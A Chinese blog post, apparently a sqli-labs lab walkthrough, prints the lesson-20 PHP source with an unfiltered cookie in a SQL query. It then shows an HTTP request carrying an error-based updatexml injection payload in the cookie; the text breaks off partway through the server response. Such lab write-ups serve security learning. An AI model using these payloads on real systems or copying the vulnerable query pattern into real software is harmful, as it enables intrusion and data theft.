@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+<html lang=九世>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="前言昨天看了Web安全攻防这本书的SQL二次注入那里，如果书上提供的那个测试地址失效了。还好今天的Sqli-labss第二十关。 正文首先我们先打开sqli-labs第二十关的代码仔细审计一遍 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556">
+<meta name="keywords" content="Writing">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Secondary injection of sql injection">
+<meta property="og:url" content="http://yoursite.com/2019/01/17/Secondary-injection-of-sql-injection/index.html">
+<meta property="og:site_name" content="九世的博客">
+<meta property="og:description" content="前言昨天看了Web安全攻防这本书的SQL二次注入那里，如果书上提供的那个测试地址失效了。还好今天的Sqli-labss第二十关。 正文首先我们先打开sqli-labs第二十关的代码仔细审计一遍 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556">
+<meta property="og:locale" content="九世">
+<meta property="og:image" content="http://p1.qhimgs4.com/bdr/640__/t019e2c9a650b6e85ec.jpg">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/17/kp8TLn.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/17/kp8vz4.png">
+<meta property="og:updated_time" content="2019-01-17T06:31:50.012Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Secondary injection of sql injection">
+<meta name="twitter:description" content="前言昨天看了Web安全攻防这本书的SQL二次注入那里，如果书上提供的那个测试地址失效了。还好今天的Sqli-labss第二十关。 正文首先我们先打开sqli-labs第二十关的代码仔细审计一遍 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556">
+<meta name="twitter:image" content="http://p1.qhimgs4.com/bdr/640__/t019e2c9a650b6e85ec.jpg">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>Secondary injection of sql injection</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="http://github.com/422926799">Projects</a></li>
+         
+          <li><a href="/Search">Search</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2019/01/16/Vulnerability-project/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2019/01/17/Secondary-injection-of-sql-injection/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2019/01/17/Secondary-injection-of-sql-injection/&text=Secondary injection of sql injection"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2019/01/17/Secondary-injection-of-sql-injection/&title=Secondary injection of sql injection"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2019/01/17/Secondary-injection-of-sql-injection/&is_video=false&description=Secondary injection of sql injection"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Secondary injection of sql injection&body=Check out this article: http://yoursite.com/2019/01/17/Secondary-injection-of-sql-injection/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2019/01/17/Secondary-injection-of-sql-injection/&title=Secondary injection of sql injection"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2019/01/17/Secondary-injection-of-sql-injection/&title=Secondary injection of sql injection"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2019/01/17/Secondary-injection-of-sql-injection/&title=Secondary injection of sql injection"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2019/01/17/Secondary-injection-of-sql-injection/&title=Secondary injection of sql injection"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2019/01/17/Secondary-injection-of-sql-injection/&name=Secondary injection of sql injection&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#正文"><span class="toc-number">2.</span> <span class="toc-text">正文</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index my4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Secondary injection of sql injection
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">九世的博客</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2019-01-17T05:59:34.000Z" itemprop="datePublished">2019-01-17</time>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/Writing/">Writing</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>昨天看了Web安全攻防这本书的SQL二次注入那里，如果书上提供的那个测试地址失效了。还好今天的Sqli-labss第二十关。<br><img src="http://p1.qhimgs4.com/bdr/640__/t019e2c9a650b6e85ec.jpg" alt="t019e2c9a650b6e85ec.jpg"></p>
+<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>首先我们先打开sqli-labs第二十关的代码仔细审计一遍</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;</span><br><span class="line">&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</span><br><span class="line"></span><br><span class="line">&lt;title&gt;Less-20 Cookie Injection- Error Based- string&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body bgcolor=&quot;#000000&quot;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">//including the Mysql connect parameters.</span><br><span class="line">	include(&quot;../sql-connections/sql-connect.php&quot;); /*包含该php文件*/</span><br><span class="line">	error_reporting(0);</span><br><span class="line">if(!isset($_COOKIE[&apos;uname&apos;])) /*如果变量不存在则执行*/</span><br><span class="line">	&#123;</span><br><span class="line">	//including the Mysql connect parameters.</span><br><span class="line">	include(&quot;../sql-connections/sql-connect.php&quot;);</span><br><span class="line"></span><br><span class="line">	echo &quot;&lt;div style=&apos; margin-top:20px;color:#FFF; font-size:24px; text-align:center&apos;&gt; Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&apos;#FF0000&apos;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;&lt;/div&gt;&quot;;</span><br><span class="line">	echo &quot;&lt;div  align=&apos;center&apos; style=&apos;margin:20px 0px 0px 510px;border:20px; background-color:#0CF; text-align:center;width:400px; height:150px;&apos;&gt;&quot;;</span><br><span class="line">	echo &quot;&lt;div style=&apos;padding-top:10px; font-size:15px;&apos;&gt;&quot;;</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">	echo &quot;&lt;!--Form to post the contents --&gt;&quot;;</span><br><span class="line">	echo &apos;&lt;form action=&quot; &quot; name=&quot;form1&quot; method=&quot;post&quot;&gt;&apos;;</span><br><span class="line"></span><br><span class="line">	echo &apos; &lt;div style=&quot;margin-top:15px; height:30px;&quot;&gt;Username : &amp;nbsp;&amp;nbsp;&amp;nbsp;&apos;;</span><br><span class="line">	echo &apos;   &lt;input type=&quot;text&quot;  name=&quot;uname&quot; value=&quot;&quot;/&gt;  &lt;/div&gt;&apos;;</span><br><span class="line">  </span><br><span class="line">	echo &apos; &lt;div&gt; Password : &amp;nbsp; &amp;nbsp; &amp;nbsp;&apos;;</span><br><span class="line">	echo &apos;   &lt;input type=&quot;text&quot; name=&quot;passwd&quot; value=&quot;&quot;/&gt;&lt;/div&gt;&lt;/br&gt;&apos;;	</span><br><span class="line">	echo &apos;   &lt;div style=&quot; margin-top:9px;margin-left:90px;&quot;&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt;&lt;/div&gt;&apos;;</span><br><span class="line"></span><br><span class="line">	echo &apos;&lt;/form&gt;&apos;;</span><br><span class="line">	echo &apos;&lt;/div&gt;&apos;;</span><br><span class="line">	echo &apos;&lt;/div&gt;&apos;;</span><br><span class="line">	echo &apos;&lt;div style=&quot; margin-top:10px;color:#FFF; font-size:23px; text-align:center&quot;&gt;&apos;;</span><br><span class="line">	echo &apos;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&apos;;</span><br><span class="line">	echo &apos;&lt;center&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&apos;;</span><br><span class="line">	echo &apos;&lt;img src=&quot;../images/Less-20.jpg&quot; /&gt;&apos;;</span><br><span class="line">	echo &apos;&lt;/center&gt;&apos;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">function check_input($value)</span><br><span class="line">	&#123;</span><br><span class="line">	if(!empty($value)) /*如果变量不为空*/</span><br><span class="line">		&#123;</span><br><span class="line">		$value = substr($value,0,20); // truncation (see comments) /*从0的位置开始读取，长度为20*/</span><br><span class="line">		&#125;</span><br><span class="line">		if (get_magic_quotes_gpc())  // Stripslashes if magic quotes enabled /*开启magic_quotes*/</span><br><span class="line">			&#123;</span><br><span class="line">			$value = stripslashes($value); /*反引用一个引用字符串*/</span><br><span class="line">			&#125;</span><br><span class="line">		if (!ctype_digit($value))   	// Quote if not a number /*纯数字检查*/</span><br><span class="line">			&#123;</span><br><span class="line">			$value = &quot;&apos;&quot; . mysql_real_escape_string($value) . &quot;&apos;&quot;;</span><br><span class="line">			&#125;</span><br><span class="line">	else</span><br><span class="line">		&#123;</span><br><span class="line">		$value = intval($value); /*取整数*/</span><br><span class="line">		&#125;</span><br><span class="line">	return $value;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">	echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">	</span><br><span class="line">	if(isset($_POST[&apos;uname&apos;]) &amp;&amp; isset($_POST[&apos;passwd&apos;])) /*判断uname和passwd是否存在*/</span><br><span class="line">		&#123;</span><br><span class="line">	</span><br><span class="line">		$uname = check_input($_POST[&apos;uname&apos;]); /*调用check_input过滤变量*/</span><br><span class="line">		$passwd = check_input($_POST[&apos;passwd&apos;]);</span><br><span class="line">		</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">		</span><br><span class="line">		$sql=&quot;SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&quot;;</span><br><span class="line">		$result1 = mysql_query($sql); /*查询数据库*/</span><br><span class="line">		$row1 = mysql_fetch_array($result1);</span><br><span class="line">		$cookee = $row1[&apos;username&apos;];</span><br><span class="line">			if($row1)</span><br><span class="line">				&#123;</span><br><span class="line">				echo &apos;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&apos;;</span><br><span class="line">				setcookie(&apos;uname&apos;, $cookee, time()+3600);	</span><br><span class="line">				header (&apos;Location: index.php&apos;);</span><br><span class="line">				echo &quot;I LOVE YOU COOKIES&quot;;</span><br><span class="line">				echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">				echo &apos;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;&apos;;			</span><br><span class="line">				//echo &apos;Your Cookie is: &apos; .$cookee;</span><br><span class="line">				echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">				echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">				print_r(mysql_error());			</span><br><span class="line">				echo &quot;&lt;br&gt;&lt;br&gt;&quot;;</span><br><span class="line">				echo &apos;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&apos;;</span><br><span class="line">				echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">				&#125;</span><br><span class="line">			else</span><br><span class="line">				&#123;</span><br><span class="line">				echo &apos;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&apos;;</span><br><span class="line">				//echo &quot;Try again looser&quot;;</span><br><span class="line">				print_r(mysql_error());</span><br><span class="line">				echo &quot;&lt;/br&gt;&quot;;			</span><br><span class="line">				echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">				echo &apos;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&apos;;	</span><br><span class="line">				echo &quot;&lt;/font&gt;&quot;;  </span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		</span><br><span class="line">			echo &quot;&lt;/font&gt;&quot;;  </span><br><span class="line">	echo &apos;&lt;/font&gt;&apos;;</span><br><span class="line">	echo &apos;&lt;/div&gt;&apos;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	if(!isset($_POST[&apos;submit&apos;])) /*如果submit不存在*/</span><br><span class="line">		&#123;</span><br><span class="line">			</span><br><span class="line">			$cookee = $_COOKIE[&apos;uname&apos;];</span><br><span class="line">			$format = &apos;D d M Y - H:i:s&apos;;</span><br><span class="line">			$timestamp = time() + 3600;</span><br><span class="line">			echo &quot;&lt;center&gt;&quot;;</span><br><span class="line">			echo &apos;&lt;br&gt;&lt;br&gt;&lt;br&gt;&apos;;</span><br><span class="line">			echo &apos;&lt;img src=&quot;../images/Less-20.jpg&quot; /&gt;&apos;;</span><br><span class="line">			echo &quot;&lt;br&gt;&lt;br&gt;&lt;b&gt;&quot;;</span><br><span class="line">			echo &apos;&lt;br&gt;&lt;font color= &quot;red&quot; font size=&quot;4&quot;&gt;&apos;;	</span><br><span class="line">			echo &quot;YOUR USER AGENT IS : &quot;.$_SERVER[&apos;HTTP_USER_AGENT&apos;];</span><br><span class="line">			echo &quot;&lt;/font&gt;&lt;br&gt;&quot;;	</span><br><span class="line">			echo &apos;&lt;font color= &quot;cyan&quot; font size=&quot;4&quot;&gt;&apos;;	</span><br><span class="line">			echo &quot;YOUR IP ADDRESS IS : &quot;.$_SERVER[&apos;REMOTE_ADDR&apos;];			</span><br><span class="line">			echo &quot;&lt;/font&gt;&lt;br&gt;&quot;;			</span><br><span class="line">			echo &apos;&lt;font color= &quot;#FFFF00&quot; font size = 4 &gt;&apos;;</span><br><span class="line">			echo &quot;DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE &lt;br&gt;&quot;;</span><br><span class="line">			echo &apos;&lt;font color= &quot;orange&quot; font size = 5 &gt;&apos;;			</span><br><span class="line">			echo &quot;YOUR COOKIE : uname = $cookee and expires: &quot; . date($format, $timestamp);</span><br><span class="line">			</span><br><span class="line">			</span><br><span class="line">			echo &quot;&lt;br&gt;&lt;/font&gt;&quot;;</span><br><span class="line">			$sql=&quot;SELECT * FROM users WHERE username=&apos;$cookee&apos; LIMIT 0,1&quot;;</span><br><span class="line">			$result=mysql_query($sql);</span><br><span class="line">			if (!$result)</span><br><span class="line">  				&#123;</span><br><span class="line">  				die(&apos;Issue with your mysql: &apos; . mysql_error());</span><br><span class="line">  				&#125;</span><br><span class="line">			$row = mysql_fetch_array($result);</span><br><span class="line">			if($row)</span><br><span class="line">				&#123;</span><br><span class="line">			  	echo &apos;&lt;font color= &quot;pink&quot; font size=&quot;5&quot;&gt;&apos;;	</span><br><span class="line">			  	echo &apos;Your Login name:&apos;. $row[&apos;username&apos;];</span><br><span class="line">			  	echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">				echo &apos;&lt;font color= &quot;grey&quot; font size=&quot;5&quot;&gt;&apos;;  	</span><br><span class="line">				echo &apos;Your Password:&apos; .$row[&apos;password&apos;];</span><br><span class="line">			  	echo &quot;&lt;/font&gt;&lt;/b&gt;&quot;;</span><br><span class="line">				echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">				echo &apos;Your ID:&apos; .$row[&apos;id&apos;];</span><br><span class="line">			  	&#125;</span><br><span class="line">			else	</span><br><span class="line">				&#123;</span><br><span class="line">				echo &quot;&lt;center&gt;&quot;;</span><br><span class="line">				echo &apos;&lt;br&gt;&lt;br&gt;&lt;br&gt;&apos;;</span><br><span class="line">				echo &apos;&lt;img src=&quot;../images/slap1.jpg&quot; /&gt;&apos;;</span><br><span class="line">				echo &quot;&lt;br&gt;&lt;br&gt;&lt;b&gt;&quot;;</span><br><span class="line">				//echo &apos;&lt;img src=&quot;../images/Less-20.jpg&quot; /&gt;&apos;;</span><br><span class="line">				&#125;</span><br><span class="line">			echo &apos;&lt;center&gt;&apos;;</span><br><span class="line">			echo &apos;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&apos;;</span><br><span class="line">			echo &apos;&lt;input  type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Delete Your Cookie!&quot; /&gt;&apos;;</span><br><span class="line">			echo &apos;&lt;/form&gt;&apos;;</span><br><span class="line">			echo &apos;&lt;/center&gt;&apos;;</span><br><span class="line">		&#125;	</span><br><span class="line">	else</span><br><span class="line">		&#123;</span><br><span class="line">		echo &apos;&lt;center&gt;&apos;;</span><br><span class="line">		echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">		echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">		echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">		echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">		echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">		echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">		echo &apos;&lt;font color= &quot;#FFFF00&quot; font size = 6 &gt;&apos;;</span><br><span class="line">		echo &quot; Your Cookie is deleted&quot;;</span><br><span class="line">				setcookie(&apos;uname&apos;, $row1[&apos;username&apos;], time()-3600);</span><br><span class="line">				header (&apos;Location: index.php&apos;);</span><br><span class="line">		echo &apos;&lt;/font&gt;&lt;/center&gt;&lt;/br&gt;&apos;;</span><br><span class="line">		</span><br><span class="line">		&#125;		</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">			echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">			echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">			//header (&apos;Location: main.php&apos;);</span><br><span class="line">			echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">			echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">			</span><br><span class="line">			//echo &apos;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&lt;/center&gt;&apos;;</span><br><span class="line">			//logging the connection parameters to a file for analysis.	</span><br><span class="line">		$fp=fopen(&apos;result.txt&apos;,&apos;a&apos;);</span><br><span class="line">		fwrite($fp,&apos;Cookie:&apos;.$cookee.&quot;\n&quot;);</span><br><span class="line">	</span><br><span class="line">		fclose($fp);</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>从上面的代码可以看到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">登陆的时候对uname和passwd做了严格的过滤和去除反斜线，但是在通过cookie</span><br><span class="line">查询的时候没有做过滤直接进行查询，从而引发注入。</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://s2.ax1x.com/2019/01/17/kp8TLn.png" alt="kp8TLn.png"></p>
+<p>cookie中带入注入语句：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /Less-20/index.php HTTP/1.1</span><br><span class="line">Host: 118.24.125.87:8000</span><br><span class="line">Content-Length: 0</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Origin: http://118.24.125.87:8000</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Referer: http://118.24.125.87:8000/Less-20/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8</span><br><span class="line">Cookie:  uname=admin&apos; and updatexml(1,concat(0x7e,(select user()),0x7e),1) and &apos;1&apos;=&apos;1</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
+<p>返回结果：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Thu, 17 Jan 2019 05:37:48 GMT</span><br><span class="line">Server: Apache/2.4.7 (Ubuntu)</span><br><span class="line">X-Powered-By: PHP/5.5.9-1ubuntu4.13</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">Content-Length: 1028</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/html</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;</span><br><span 